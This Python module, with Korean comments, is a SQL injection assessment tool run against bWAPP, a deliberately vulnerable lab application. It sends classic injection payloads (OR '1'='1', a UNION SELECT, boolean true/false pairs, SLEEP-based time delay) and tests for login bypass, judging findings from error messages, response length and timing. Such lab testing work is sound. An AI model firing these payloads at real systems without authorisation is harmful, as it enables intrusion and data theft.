"""SQL injection assessment logic."""

import json
import time
from pathlib import Path

import requests

DB_ERROR_KEYWORDS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unknown column",
    "sql syntax",
]


def login_bwapp(base_url: str, username: str = "bee", password: str = "bug", timeout: int = 10) -> requests.Session:
    """bWAPP에 로그인하고, 로그인 상태가 유지된 세션을 돌려준다."""
    session = requests.Session()
    session.post(
        f"{base_url}/login.php",
        data={"login": username, "password": password, "security_level": "0", "form": "submit"},
        timeout=timeout,
    )
    return session


def _looks_like_db_error(response_text: str) -> bool:
    lowered = response_text.lower()
    return any(keyword in lowered for keyword in DB_ERROR_KEYWORDS)


def _response_diff_ratio(text_a: str, text_b: str) -> float:
    len_a, len_b = len(text_a), len(text_b)
    longer = max(len_a, len_b, 1)
    return abs(len_a - len_b) / longer


def run_case(base_url: str, path: str, parameter: str, payload: str,
             baseline_value: str = "laptop", timeout: int = 10,
             session: requests.Session | None = None) -> dict:
    """신호 ①DB오류 ②응답차이 ④시간지연을 확인한다."""
    client = session or requests
    url = f"{base_url}{path}"

    baseline_started = time.monotonic()
    baseline_resp = client.get(url, params={parameter: baseline_value}, timeout=timeout)
    baseline_elapsed_ms = int((time.monotonic() - baseline_started) * 1000)

    started = time.monotonic()
    resp = client.get(url, params={parameter: payload}, timeout=timeout)
    elapsed_ms = int((time.monotonic() - started) * 1000)

    db_error = _looks_like_db_error(resp.text)
    time_delay = elapsed_ms > baseline_elapsed_ms + 3000
    diff_ratio = _response_diff_ratio(resp.text, baseline_resp.text)
    response_diff = diff_ratio > 0.5

    if db_error:
        rule_label, rule_reason = "취약 의심", "DB 오류 메시지가 응답에 노출됨"
    elif time_delay:
        rule_label, rule_reason = "취약 의심", "정상 요청보다 응답이 3초 이상 지연됨(시간 지연 의심)"
    elif response_diff:
        rule_label, rule_reason = "취약 의심", f"정상 요청과 응답 길이가 {diff_ratio:.0%} 차이남(응답 차이 의심)"
    else:
        rule_label, rule_reason = "양호", "DB 오류·시간 지연·응답 차이 신호가 관찰되지 않음"

    return {
        "finding_id": f"SQLI-{int(time.time() * 1000)}",
        "vuln_type": "SQLI",
        "url": url,
        "parameter": parameter,
        "payload": payload,
        "rule_label": rule_label,
        "response_body": resp.text,
        "rule_reason": rule_reason,
        "http_status": resp.status_code,
        "elapsed_ms": elapsed_ms,
        "baseline_elapsed_ms": baseline_elapsed_ms,
    }


def check_boolean_pair(base_url: str, path: str, parameter: str,
                        true_payload: str, false_payload: str, timeout: int = 10,
                        session: requests.Session | None = None, threshold: float = 0.2) -> dict:
    """신호 ③ 참/거짓 쌍: 두 페이로드의 응답을 서로 직접 비교한다(기준값과 비교하지 않음)."""
    client = session or requests
    url = f"{base_url}{path}"

    true_resp = client.get(url, params={parameter: true_payload}, timeout=timeout)
    false_resp = client.get(url, params={parameter: false_payload}, timeout=timeout)
    diff_ratio = _response_diff_ratio(true_resp.text, false_resp.text)
    boolean_signal = diff_ratio > threshold

    if boolean_signal:
        rule_label = "취약 의심"
        rule_reason = f"참({true_payload!r})/거짓({false_payload!r}) 응답이 {diff_ratio:.0%} 다름(Boolean-based 의심)"
    else:
        rule_label = "양호"
        rule_reason = f"참/거짓 페이로드 응답이 비슷함(Boolean-based 신호 없음, 차이 {diff_ratio:.1%})"

    return {
        "finding_id": f"SQLI-{int(time.time() * 1000)}",
        "vuln_type": "SQLI",
        "url": url,
        "parameter": parameter,
        "payload": f"{true_payload} | {false_payload}",
        "rule_label": rule_label,
        "response_body": true_resp.text,
        "rule_reason": rule_reason,
        "http_status": true_resp.status_code,
        "elapsed_ms": None,
        "baseline_elapsed_ms": None,
    }


def check_login_bypass(base_url: str, path: str, username_param: str, password_param: str,
                        username_payload: str, wrong_password: str = "wrong-password-123",
                        success_keyword: str = "로그인 성공", timeout: int = 10,
                        session: requests.Session | None = None) -> dict:
    """신호 ⑤ 로그인 우회: 잘못된 비밀번호로도 로그인이 성공하는지 확인한다."""
    client = session or requests
    url = f"{base_url}{path}"
    resp = client.post(
        url,
        data={username_param: username_payload, password_param: wrong_password},
        timeout=timeout,
    )
    bypassed = success_keyword in resp.text

    if bypassed:
        rule_label, rule_reason = "취약 의심", "잘못된 비밀번호인데도 로그인 성공 문구가 반환됨(인증 우회 의심)"
    else:
        rule_label, rule_reason = "양호", "로그인 우회 신호가 관찰되지 않음"

    return {
        "finding_id": f"SQLI-{int(time.time() * 1000)}",
        "vuln_type": "SQLI",
        "url": url,
        "parameter": username_param,
        "payload": username_payload,
        "rule_label": rule_label,
        "response_body": resp.text,
        "rule_reason": rule_reason,
        "http_status": resp.status_code,
        "elapsed_ms": None,
        "baseline_elapsed_ms": None,
    }


def _load_json(path: str):
    with open(path, encoding="utf-8") as f:
        return json.load(f)


def run_all(base_url: str, targets_path: str, payloads_path: str, output_path: str,
            session: requests.Session | None = None) -> list:
    targets = _load_json(targets_path)
    sqli_targets = [t for t in targets if t.get("vuln_type") == "SQLI"]

    payload_groups = _load_json(payloads_path)
    boolean_pairs = payload_groups.pop("attack_boolean_pairs", [])
    payload_groups.pop("attack_login_bypass", None)
    all_payloads = [p for group in payload_groups.values() for p in group]

    results = []
    for target in sqli_targets:
        for payload in all_payloads:
            try:
                finding = run_case(base_url, target["url"], target["parameter"], payload, session=session)
            except requests.RequestException as exc:
                finding = {
                    "finding_id": f"SQLI-{int(time.time() * 1000)}", "vuln_type": "SQLI",
                    "url": f"{base_url}{target['url']}", "parameter": target["parameter"],
                    "payload": payload, "rule_label": "오류", "response_body": "",
                    "rule_reason": f"요청 실패: {exc}", "http_status": None,
                    "elapsed_ms": None, "baseline_elapsed_ms": None,
                }
            results.append(finding)
            print(f"[{finding['finding_id']}] {finding['rule_label']} | target={target['target_id']} payload={payload!r}")

        for pair in boolean_pairs:
            true_payload, false_payload = pair[0], pair[1]
            try:
                finding = check_boolean_pair(base_url, target["url"], target["parameter"], true_payload, false_payload, session=session)
            except requests.RequestException as exc:
                finding = {
                    "finding_id": f"SQLI-{int(time.time() * 1000)}", "vuln_type": "SQLI",
                    "url": f"{base_url}{target['url']}", "parameter": target["parameter"],
                    "payload": f"{true_payload} | {false_payload}", "rule_label": "오류", "response_body": "",
                    "rule_reason": f"요청 실패: {exc}", "http_status": None,
                    "elapsed_ms": None, "baseline_elapsed_ms": None,
                }
            results.append(finding)
            print(f"[{finding['finding_id']}] {finding['rule_label']} | target={target['target_id']} boolean_pair={true_payload!r}/{false_payload!r}")

    out_path = Path(output_path)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)

    return results


if __name__ == "__main__":
    bwapp_base = "http://192.168.42.129/bWAPP"
    session = login_bwapp(bwapp_base)

    print("=== 신호 ① DB 오류 노출 (GET/Select) ===")
    try:
        r1 = run_case(bwapp_base, "/sqli_2.php?action=go", "movie", "1' OR '1'='1",
                      baseline_value="1", session=session)
        print(r1["rule_label"], "-", r1["rule_reason"])
    except requests.exceptions.RequestException as exc:
        print("테스트 실패:", exc)

    print("\n=== 신호 ② 응답 본문 차이 (GET/Search) ===")
    try:
        r2 = run_case(bwapp_base, "/sqli_1.php?action=search", "title",
                      "' UNION SELECT null,null,null,null,null,null-- -",
                      baseline_value="test123없는값", session=session)
        print(r2["rule_label"], "-", r2["rule_reason"])
    except requests.exceptions.RequestException as exc:
        print("테스트 실패:", exc)

    print("\n=== 신호 ③ 참/거짓 쌍 (Boolean-based) ===")
    try:
        r3 = check_boolean_pair(bwapp_base, "/sqli_2.php?action=go", "movie",
                                 "1 AND 1=1", "1 AND 1=2", timeout=15, threshold=0.005, session=session)
        print(r3["rule_label"], "-", r3["rule_reason"])
    except requests.exceptions.RequestException as exc:
        print("테스트 실패(직전 시간지연 테스트 여파일 수 있음, 잠시 후 재실행 권장):", exc)

    print("\n=== 신호 ④ 시간 지연 (Time-based) ===")
    try:
        r4 = run_case(bwapp_base, "/sqli_2.php?action=go", "movie", "1 OR SLEEP(5)",
                      baseline_value="1", timeout=20, session=session)
        print(r4["rule_label"], "-", r4["rule_reason"], f"(응답시간={r4['elapsed_ms']}ms)")
    except requests.exceptions.Timeout:
        print("취약 의심 - 응답이 20초 넘게 지연되어 타임아웃 발생 (매우 강한 시간 지연 신호)")

    print("\n(서버가 방금 무거운 쿼리를 처리했으니 5초 대기 후 종료합니다...)")
    time.sleep(5)